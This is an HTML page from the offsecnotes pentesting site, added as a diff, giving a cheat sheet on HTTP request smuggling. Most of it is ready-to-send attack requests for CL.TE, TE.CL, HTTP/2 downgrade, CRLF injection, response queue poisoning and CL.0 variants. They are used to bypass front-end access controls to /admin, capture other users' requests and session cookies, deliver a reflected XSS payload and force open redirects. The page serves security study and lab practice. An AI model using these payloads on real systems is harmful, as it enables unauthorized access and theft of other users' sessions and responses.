@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | HTTP request smuggling</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>HTTP request smuggling</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#identification" id="toc-identification">Identification</a>
+<ul>
+<li><a href="#cl.te" id="toc-cl.te">CL.TE</a></li>
+<li><a href="#te.cl" id="toc-te.cl">TE.CL</a></li>
+</ul></li>
+<li><a href="#confirmationexploitation" id="toc-confirmationexploitation">Confirmation/Exploitation</a>
+<ul>
+<li><a href="#cl.te-1" id="toc-cl.te-1">CL.TE</a></li>
+<li><a href="#te.cl-1" id="toc-te.cl-1">TE.CL</a></li>
+</ul></li>
+<li><a href="#exploitation" id="toc-exploitation">Exploitation</a>
+<ul>
+<li><a href="#bypass-front-end-security-controls" id="toc-bypass-front-end-security-controls">Bypass front-end security controls</a></li>
+<li><a href="#revealing-front-end-request-rewriting" id="toc-revealing-front-end-request-rewriting">Revealing front-end request rewriting</a></li>
+<li><a href="#capturing-other-users-requests" id="toc-capturing-other-users-requests">Capturing other users’ requests</a></li>
+<li><a href="#exploit-reflected-xss" id="toc-exploit-reflected-xss">Exploit reflected XSS</a></li>
+<li><a href="#open-redirect" id="toc-open-redirect">Open redirect</a></li>
+</ul></li>
+<li><a href="#content-length-in-the-smuggled-request" id="toc-content-length-in-the-smuggled-request">Content-Length in the smuggled request</a></li>
+<li><a href="#http2-request-smuggling" id="toc-http2-request-smuggling">HTTP/2 request smuggling</a></li>
+<li><a href="#identification-1" id="toc-identification-1">Identification</a>
+<ul>
+<li><a href="#h2.cl" id="toc-h2.cl">H2.CL</a></li>
+<li><a href="#h2.te" id="toc-h2.te">H2.TE</a></li>
+</ul></li>
+<li><a href="#exploitation-1" id="toc-exploitation-1">Exploitation</a>
+<ul>
+<li><a href="#h2.cl-1" id="toc-h2.cl-1">H2.CL</a></li>
+<li><a href="#h2.te-1" id="toc-h2.te-1">H2.TE</a></li>
+</ul></li>
+<li><a href="#request-smuggling-via-crlf-injection" id="toc-request-smuggling-via-crlf-injection">Request smuggling via CRLF injection</a></li>
+<li><a href="#response-queue-poisoning" id="toc-response-queue-poisoning">Response queue poisoning</a></li>
+<li><a href="#http2-request-splitting" id="toc-http2-request-splitting">HTTP/2 request splitting</a></li>
+<li><a href="#cl.0h2.0-request-smuggling" id="toc-cl.0h2.0-request-smuggling">CL.0/H2.0 request smuggling</a></li>
+</ul></div>
+  <hr>
+<details>
+<summary>
+General info
+</summary>
+<ul>
+<li><p>HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.</p></li>
+<li><p>Request smuggling is associated to HTTP/1 requests but can also affect HTTP/2-supported websites based on their backend structure.</p></li>
+<li><p>Modern web apps often use chains of HTTP servers, with users sending requests to a front-end server (sometimes referred to as a load balancer or reverse proxy), which in turn forwards requests to multiple back-end servers.</p></li>
+<li><p>Front-end and back-end systems must agree on request boundaries to prevent ambiguous requests that attackers can exploit.</p></li>
+</ul>
+</details>
+<details>
+<summary>
+How do HTTP request smuggling vulnerabilities arise?
+</summary>
+<p>HTTP request smuggling vulnerabilities often occur due to the HTTP/1 specification offering two methods to define the request’s end: the <code>Content-Length</code> header and <code>Transfer-Encoding</code> header.</p>
+<ul>
+<li>The <code>Content-Length header</code> specifies the length of the message body in bytes</li>
+<li>The <code>Transfer-Encoding</code> header specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data
+<ul>
+<li>Each chunk comprises a size in hexadecimal bytes, a newline, and the chunk’s content. The message concludes with a zero-sized chunk.</li>
+</ul></li>
+</ul>
+<p>Type of HTTP-request-smuggling</p>
+<ul>
+<li><strong>TE.CL</strong>: the front-end server uses the <code>Transfer-Encoding</code> header and the back-end server uses the <code>Content-Length</code> header.</li>
+<li><strong>CL.TE</strong>: the front-end server uses the <code>Content-Length</code> header and the back-end server uses the <code>Transfer-Encoding</code> header.</li>
+<li><strong>TE.TE</strong>: the front-end and back-end servers both support the <code>Transfer-Encoding</code> header, but one of the servers can be induced not to process it by obfuscating the header in some way.</li>
+</ul>
+<pre class="http"><code>POST /search HTTP/1.1
+Host: normal-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+b
+q=smuggling
+0</code></pre>
+</details>
+<hr />
+<h2 id="identification">Identification</h2>
+<blockquote>
+<p><strong>Warning</strong>:</p>
+<ul>
+<li><code>Connection</code> header mustn’t be set to <code>close</code>. Set it to <code>keep-alive</code>.</li>
+<li>In early techniques you must use <code>HTTP/1.1</code> protocol, not <code>HTTP/2</code>. In burp change it using Inspector.</li>
+</ul>
+</blockquote>
+<h3 id="cl.te">CL.TE</h3>
+<pre class="http"><code>POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Transfer-Encoding: chunked\r\n
+Content-Length: 4\r\n
+\r\n
+1\r\n
+A\r\n
+X</code></pre>
+<p><code>Content-Length=4</code> -&gt; <code>1</code> <code>\r</code> <code>\n</code> <code>A</code></p>
+<ul>
+<li>The <strong>front-end</strong> server processes the initial chunk based on the Transfer-Encoding header, forwarding only part of the request while omitting the <code>X</code>.</li>
+<li>After processing the first chunk, the <strong>backend</strong> server waits for the next one, causing a noticeable time delay.</li>
+</ul>
+<h3 id="te.cl">TE.CL</h3>
+<pre class="http"><code>POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Transfer-Encoding: chunked\r\n
+Content-Length: 6\r\n
+\r\n
+0\r\n
+\r\n
+X</code></pre>
+<p><code>Content-Length=6</code> -&gt; <code>0</code> <code>\r</code> <code>\n</code> <code>\r</code> <code>\n</code> <code>X</code></p>
+<p>The back-end server, relying on the Content-Length header, waits for additional message body content, resulting in a noticeable time delay.</p>
+<blockquote>
+<p><strong>Warning</strong>: The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.</p>
+</blockquote>
+<hr />
+<h2 id="confirmationexploitation">Confirmation/Exploitation</h2>
+<p>Normal request</p>
+<pre class="http"><code>POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling</code></pre>
+<h3 id="cl.te-1">CL.TE</h3>
+<pre class="http"><code>POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&amp;x=
+0
+
+GET /404 HTTP/1.1
+Foo: x</code></pre>
+<p><code>Content-Length: 49</code> -&gt; all chars until <code>Foo:x</code> (include <code>\r\n</code>)</p>
+<p><code>e</code> (hex) -&gt; Length <code>q=smuggling&amp;x=</code></p>
+<p>Then send normal request. This will cause the subsequent “normal” request to look like this:</p>
+<pre class="http"><code>GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling</code></pre>
+<p>The server will respond with status code 404, indicating that the attack successful.</p>
+<h3 id="te.cl-1">TE.CL</h3>
+<pre class="http"><code>POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7b
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0\r\n
+\r\n</code></pre>
+<p><code>7b</code> -&gt; all chars from <code>GET</code> until <code>x=</code></p>
+<p><code>Content-Length: 4</code> -&gt; <code>7</code> <code>c</code> <code>\r</code> <code>\n</code></p>
+<blockquote>
+<p><strong>Note</strong>: Update Content-Length must be unchecked.</p>
+</blockquote>
+<hr />
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="bypass-front-end-security-controls">Bypass front-end security controls</h3>
+<p><strong>CL.TE</strong></p>
+<pre class="http"><code>POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: x</code></pre>
+<p>When you go to <code>/home</code>, the following request will be made</p>
+<pre class="http"><code>GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: xGET /home HTTP/1.1
+Host: vulnerable-website.com</code></pre>
+<ul>
+<li>The front-end server sees two requests here, both for <code>/home</code>, and so the requests are forwarded to the back-end server.</li>
+<li>The back-end server sees requests for <code>/home</code> and <code>/admin</code>, assumes they’ve passed front-end controls, and grants access to the restricted URL.</li>
+</ul>
+<h3 id="revealing-front-end-request-rewriting">Revealing front-end request rewriting</h3>
+<p><strong>CL.TE</strong></p>
+<p>Find a request that reflects the value</p>
+<pre class="http"><code>POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+
+email=user@normal-user.net</code></pre>
+<div class="sourceCode" id="cb11"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">input</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;email&quot;</span> <span class="er">value</span><span class="ot">=</span><span class="st">&quot;user@normal-user.net&quot;</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;text&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>Use the following request smuggling attack to reveal the rewriting</p>
+<pre class="http"><code>POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+email=</code></pre>
+<div class="sourceCode" id="cb13"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">input</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;email&quot;</span> <span class="er">value</span><span class="ot">=</span><span class="st">&quot;POST /login HTTP/1.1</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="st">Host: vulnerable-website.com</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="st">X-Forwarded-For: 1.3.3.7</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="st">X-Forwarded-Proto: https</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="st">X-TLS-Bits: 128</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="st">X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256</span></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="st">X-TLS-Version: TLSv1.2</span></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="st">x-nr-external-service: external</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a><span class="st">...</span></span></code></pre></div>
+<h3 id="capturing-other-users-requests">Capturing other users’ requests</h3>
+<p><strong>CL.TE</strong></p>
+<p>Smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request.</p>
+<pre class="http"><code>POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 198
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=dL3MaAvRhsnHdriaFnPxSdvXdt3jx6B1
+Content-Length: 650
+
+csrf=ihmEx8D&amp;postId=1&amp;name=test&amp;email=test@test.test&amp;comment=</code></pre>
+<blockquote>
+<p><strong>Note</strong>: One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the <code>&amp;</code> character, meaning that the content that is stored from the victim user’s request will end at the first <code>&amp;</code>, which might even appear in the query string.</p>
+</blockquote>
+<blockquote>
+<p><strong>Tip</strong>: Another way to steal other users’ responses is with the <a href="/Web/Vulnerabilities/http%20request%20smuggling.html#response-queue-poisoning">Response queue poisoning</a> technique.</p>
+</blockquote>
+<h3 id="exploit-reflected-xss">Exploit reflected XSS</h3>
+<p><strong>CL.TE</strong></p>
+<p>You can use a request smuggling attack to target other users of the application. This method is better than standard reflected XSS because it doesn’t require victim interaction and can exploit XSS in areas like HTTP headers, which are not possible to control in typical attacks.</p>
+<pre class="http"><code>POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+User-Agent: a&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1</code></pre>
+<p>The next user’s request is appended to the smuggled one, delivering the XSS payload in their response.</p>
+<h3 id="open-redirect">Open redirect</h3>
+<p><strong>CL.TE</strong></p>
+<pre class="http"><code>GET /home HTTP/1.1
+Host: normal-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://normal-website.com/home/</code></pre>
+<p>Exploit</p>
+<pre class="http"><code>POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: X</code></pre>
+<hr />
+<h2 id="content-length-in-the-smuggled-request">Content-Length in the smuggled request</h2>
+<p>The value in the <code>Content-Length</code> header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until you have everything of interest.</p>
+<hr />
+<h2 id="http2-request-smuggling">HTTP/2 request smuggling</h2>
+<p><strong>HTTP/2 downgrading</strong></p>
+<p>HTTP/2 downgrading converts HTTP/2 requests into HTTP/1 syntax, allowing web servers and proxies to support HTTP/2 clients while communicating with HTTP/1 back-end servers.</p>
+<hr />
+<h2 id="identification-1">Identification</h2>
+<h3 id="h2.cl">H2.CL</h3>
+<pre class="http"><code>POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+GET /404 HTTP/1.1
+Foo: x</code></pre>
+<p>Then send another request and you’ll get <code>/404</code> .</p>
+<h3 id="h2.te">H2.TE</h3>
+<pre class="http"><code>POST / HTTP/2
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Foo: x</code></pre>
+<hr />
+<h2 id="exploitation-1">Exploitation</h2>
+<h3 id="h2.cl-1">H2.CL</h3>
+<pre class="http"><code>POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 5
+
+x=1</code></pre>
+<h3 id="h2.te-1">H2.TE</h3>
+<pre class="http"><code>POST / HTTP/2
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: x</code></pre>
+<hr />
+<h2 id="request-smuggling-via-crlf-injection">Request smuggling via CRLF injection</h2>
+<p>In HTTP/2 messages <code>\r\n</code> no longer has any special significance within a header value and, therefore, can be included inside the value itself without causing the header to be split. when this is rewritten as an HTTP/1 request, the <code>\r\n</code> will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers.</p>
+<p>E.g. with <strong>H2.TE</strong></p>
+<pre class="http"><code>POST / HTTP/2
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+foo: \r\nTransfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: x</code></pre>
+<blockquote>
+<p><strong>Note</strong>: To inject newlines into HTTP/2 headers, in burp use the Inspector to drill down into the header, then press the <code>Shift + Return</code> keys.</p>
+</blockquote>
+<hr />
+<h2 id="response-queue-poisoning">Response queue poisoning</h2>
+<details>
+<summary>
+Theory (in short)
+</summary>
+<p>When you smuggle a complete request, the front-end server processes a single request, but the back-end sees two requests and sends two responses. The front-end forwards the first response correctly but queues the unexpected second response. When a new request arrives, the front-end mistakenly sends the leftover response from the smuggled request, leaving the correct back-end response unmatched. This cycle repeats, disrupting the response flow for subsequent requests.</p>
+</details>
+<p>This attack can occur through HTTP/1 request smuggling or HTTP/2 downgrading.</p>
+<p>You need to smuggle a complete request.</p>
+<p>With this technique you can steal other users’ responses.</p>
+<p><strong>(CL)</strong></p>
+<pre class="http"><code>POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Content-Type: x-www-form-urlencoded\r\n
+Content-Length: 61\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+GET /anything HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n</code></pre>
+<hr />
+<h2 id="http2-request-splitting">HTTP/2 request splitting</h2>
+<p>This approach is more versatile, allowing even GET requests without relying on methods that support a body.</p>
+<pre class="http"><code>:method         GET
+:path           /
+:authority      vulnerable-website.com
+foo             bar\r\n
+                \r\n
+                GET /admin HTTP/1.1\r\n
+                Host: vulnerable-website.com</code></pre>
+<p>During rewriting, some front-end servers append the new <code>Host</code> header after existing ones. With HTTP/2, this places it after the <code>foo</code> header, leaving the first request without a <code>Host</code> header and the smuggled one with two. Inject your <code>Host</code> header so that it ends up in the first request once.</p>
+<pre class="http"><code>:method         GET
+:path           /
+:authority      vulnerable-website.com
+foo             bar\r\n
+                Host: vulnerable-website.com\r\n
+                \r\n
+                GET /admin HTTP/1.1</code></pre>
+<blockquote>
+<p><strong>Note</strong>: Here the request trigger response queue poisoning, but you can also smuggle prefixes for classic request smuggling.</p>
+</blockquote>
+<hr />
+<h2 id="cl.0h2.0-request-smuggling">CL.0/H2.0 request smuggling</h2>
+<p>Some servers ignore the <code>Content-Length</code> header, treating requests as ending at the headers, effectively making <code>Content-Length 0</code>. If the back-end behaves this way while the front-end uses Content-Length, this discrepancy enables HTTP request smuggling, termed a “CL.0” vulnerability.</p>
+<p><strong>Find an endpoint that ignores Content-Length</strong></p>
+<ul>
+<li>POST request to a static file</li>
+<li>POST request to server level redirect (<code>Location</code> header in the response)</li>
+<li>POST request that triggers a server side error</li>
+</ul>
+<p><strong>Exploitation</strong></p>
+<ol type="1">
+<li>Create one tab containing the setup request and another containing an arbitrary follow-up request.</li>
+<li>Add the two tabs to a group in the correct order.</li>
+<li>Change the Connection header to <code>keep-alive</code>.</li>
+<li>Send group in sequence (single connection)</li>
+</ol>
+<pre class="http"><code>POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
+
+GET /404 HTTP/1.1
+Foo: x</code></pre>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
